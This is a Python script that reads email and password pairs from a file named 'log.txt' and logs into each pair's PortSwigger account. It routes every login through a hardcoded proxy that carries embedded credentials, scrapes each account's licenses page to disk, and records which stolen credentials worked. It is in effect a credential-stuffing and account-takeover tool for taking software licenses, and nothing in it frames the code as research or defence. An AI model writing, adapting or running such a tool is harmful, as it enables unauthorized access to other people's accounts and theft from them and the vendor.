#!/usr/bin/env python3

import requests
import json
import time
from pathlib import Path

PROXY = 'http://buymobileproxycom:mugla9392@ankara8.buymobileproxy.com:8029'
OUTPUT_DIR = Path('extraction_results')

proxies = {
    'http': PROXY,
    'https': PROXY
}

def login_and_get_licenses(email, password):
    """Login and return licenses page HTML"""
    session = requests.Session()
    session.proxies.update(proxies)
    session.headers.update({
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
    })

    try:
        # Step 1: GET login page
        resp = session.get('https://login.portswigger.net/u/login', timeout=30)

        # Step 2: POST login credentials
        login_data = {
            'username': email,
            'password': password,
            'action': 'default'
        }
        resp = session.post(
            'https://login.portswigger.net/u/login',
            data=login_data,
            timeout=30,
            allow_redirects=True
        )

        # Step 3: GET licenses page
        resp = session.get(
            'https://portswigger.net/users/youraccount/licenses',
            timeout=30,
            allow_redirects=True
        )

        if resp.status_code == 200:
            return True, resp.text
        else:
            return False, f'Status {resp.status_code}'

    except Exception as e:
        return False, str(e)

def main():
    OUTPUT_DIR.mkdir(exist_ok=True)

    # Load accounts
    accounts = []
    with open('log.txt', 'r') as f:
        for line in f:
            line = line.strip()
            if ':' in line:
                email, password = line.split(':', 1)
                accounts.append((email, password))

    print(f'Loaded {len(accounts)} accounts\n')
    print('Extracting licenses pages...\n')

    results = []
    for i, (email, password) in enumerate(accounts, 1):
        print(f'[{i}/{len(accounts)}] {email}... ', end='', flush=True)

        success, html_or_error = login_and_get_licenses(email, password)

        if success:
            print(f'✓ ({len(html_or_error)} bytes)')

            # Save HTML
            filename = email.replace('@', '_').replace('.', '_') + '.html'
            with open(OUTPUT_DIR / filename, 'w') as f:
                f.write(html_or_error)

            results.append({
                'email': email,
                'password': password,
                'success': True,
                'file': filename
            })
        else:
            print(f'✗ {html_or_error}')
            results.append({
                'email': email,
                'password': password,
                'success': False,
                'error': html_or_error
            })

        if i < len(accounts):
            time.sleep(0.5)

    # Save results
    with open('extraction_results.json', 'w') as f:
        json.dump(results, f, indent=2)

    success_count = sum(1 for r in results if r['success'])
    print(f'\n✓ {success_count}/{len(accounts)} accounts extracted')
    print(f'✓ HTML files saved to: {OUTPUT_DIR}/')
    print(f'✓ Results log: extraction_results.json')

if __name__ == '__main__':
    main()
